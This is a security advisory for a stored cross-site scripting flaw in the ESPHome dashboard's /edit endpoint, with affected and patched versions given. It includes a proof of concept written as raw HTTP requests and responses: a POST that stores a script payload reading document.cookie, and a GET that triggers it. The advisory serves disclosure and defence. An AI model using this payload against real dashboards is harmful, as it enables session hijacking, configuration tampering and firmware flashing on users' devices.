## Package

pip

esphome
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

>= 2023.12.9, < 2024.2.2

## Patched versions

2024.2.2

## Description

### Summary

Edit configuration file API in dashboard component of ESPHome version 2023.12.9 (command line installation and Home Assistant add-on) serves unsanitized data with “Content-Type: text/html; charset=UTF-8”, allowing remote authenticated user to inject arbitrary web script and exfiltrate session cookies via Cross-Site scripting (XSS).

### Credits

### Details

It is possible for a malicious authenticated user to inject arbitrary Javascript in configuration files using a POST request to the /edit endpoint, the configuration parameter allows to specify the file to write.

To trigger the XSS vulnerability, the victim must visit the page /edit?configuration=[xss file].

### PoC

To reproduce the issue, it is possible to perform a POST request to inject the payload:

request:

POST /edit?configuration=xss.yaml HTTP/1.1

Host: localhost:6052

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:109.0) Gecko/20100101 Firefox/116.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: <http://localhost:6052/>

Connection: close

Cookie: authenticated=[replace with valid cookie]

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Content-Length: 40

<script>alert(document.cookie);</script>

---

response:

HTTP/1.1 200 OK

Server: TornadoServer/6.3.3

Content-Type: text/html; charset=UTF-8

Date: Thu, 30 Nov 2023 11:02:27 GMT

Content-Length: 0

Connection: close

And subsequently trigger the XSS with a GET request to the same endpoint:

request:

GET /edit?configuration=xss.yaml HTTP/1.1

Host: localhost:6052

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:109.0) Gecko/20100101 Firefox/116.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: <http://localhost:6052/>

Connection: close

Cookie: authenticated=2|1:0|10:1701341719|13:authenticated|4:eWVz|0907127d7274094cc5a2490b95becf5c11fd52b8c3ee3655d65fe9fda099108c

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Content-Length: 0

---

response:

HTTP/1.1 200 OK

Server: TornadoServer/6.3.3

Content-Type: text/html; charset=UTF-8

Date: Thu, 30 Nov 2023 11:04:12 GMT

Etag: "ec6c9889f5c9a6c8e9d2d5e4ce1b1a85e6e7da2b"

Content-Length: 40

Connection: close

<script>alert(document.cookie);</script>
### Impact

Abusing this vulnerability a malicious actor could perform operations on the dashboard on the behalf of a logged user, access sensitive information, create, edit and delete configuration files and flash firmware on managed boards.

In addition to this, cookies are not correctly secured, allowing the exfiltration of session cookie values.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
